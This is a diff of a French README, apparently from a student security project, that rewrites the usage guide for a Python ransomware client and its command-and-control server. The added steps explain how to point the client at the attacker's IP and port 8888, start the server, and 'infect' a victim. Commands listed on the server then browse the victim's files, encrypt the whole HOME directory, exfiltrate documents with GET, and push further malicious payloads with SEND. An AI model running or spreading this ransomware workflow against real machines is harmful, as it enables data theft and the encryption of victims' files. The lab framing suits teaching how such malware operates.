@@ -65,36 +65,54 @@ Conformément aux exigences de la Partie 2 du sujet, un système de logs complet
 5. Guide d'Utilisation (Lancement du Projet)
 Prérequis
 
-    Deux machines (ou deux terminaux) sous Linux (Debian recommandé).
+    Prérequis
 
-    Python 3 installé.
+    Environnement : Deux terminaux sur la même machine (localhost) ou deux machines Linux distinctes sur le même réseau.
 
-Étape 1 : Lancer le Serveur (Attaquant)
+    Langage : Python 3.x installé sur les deux postes.
 
-Ouvrez un terminal et placez-vous dans le dossier du serveur :
+    Structure : Les scripts c2_server.py et ransomware_client.py doivent être accessibles.
+
+Étape 0 : Configuration de l'IP (Optionnel)
+
+Par défaut, le malware cherche le serveur sur 127.0.0.1 (votre propre machine).
+
+    Si vous testez sur deux machines différentes, modifiez la ligne suivante dans ransomware_client.py :
+    Python
+
+    s.connect(("ADRESSE_IP_DU_SERVEUR", 8888))
+
+Étape 1 : Lancement du Serveur (Attaquant)
+
+Ouvrez un terminal sur la machine de l'attaquant et lancez le script :
 Bash
 
-python3 /home/yassine/Documents/c2_server.py
+python3 c2_server.py
 
-Le serveur affichera : [*] SERVEUR C2 PRET - En attente de connexion...
-Étape 2 : Lancer le Malware (Victime)
+Le serveur se met en écoute : [*] SERVEUR C2 PRET - En attente de connexion...
+Étape 2 : Infection de la Cible (Victime)
 
-Ouvrez un second terminal et lancez l'agent :
+Ouvrez un terminal sur la machine victime et lancez le malware :
 Bash
 
-python3 /home/yassine/Documents/ransomware_client.py
+python3 ransomware_client.py
 
-Étape 3 : Interaction
+Dès l'exécution, le serveur reçoit les informations d'identification (UUID et Clé XOR).
+Étape 3 : Interaction et Contrôle
 
-Une fois la connexion établie, le serveur affiche un menu d'aide. Vous pouvez alors taper :
+Une fois la connexion établie, le serveur affiche le menu d'aide. Vous pouvez alors piloter la victime avec les commandes suivantes :
 
-    ls -a : Pour voir les fichiers de la victime.
+    Exploration : Tapez ls -a ou pwd pour naviguer dans le système de la victime.
 
-    ENCRYPT : Pour lancer le chiffrement du HOME.
+    Attaque : Tapez ENCRYPT pour chiffrer l'intégralité du répertoire HOME (les fichiers système sensibles sont automatiquement ignorés pour préserver la stabilité de la session).
 
-    cat ~/.system_trace.log : Pour voir les logs d'activité sur la victime.
+    Restauration : Tapez DECRYPT pour rétablir les fichiers originaux à l'aide de la clé de session.
 
-    GET <fichier> : Pour voler un document.
+    Espionnage (Logs) : Tapez cat ~/.system_trace.log pour consulter en temps réel le journal d'activité du malware sur la machine cible.
+
+    Exfiltration : Tapez GET Documents/secret.txt pour copier un fichier de la victime vers votre machine d'attaquant.
+
+    Infiltration : Tapez SEND payload.sh pour envoyer un nouveau fichier malveillant sur la machine victime.
 
 6. Analyse des Limites
 
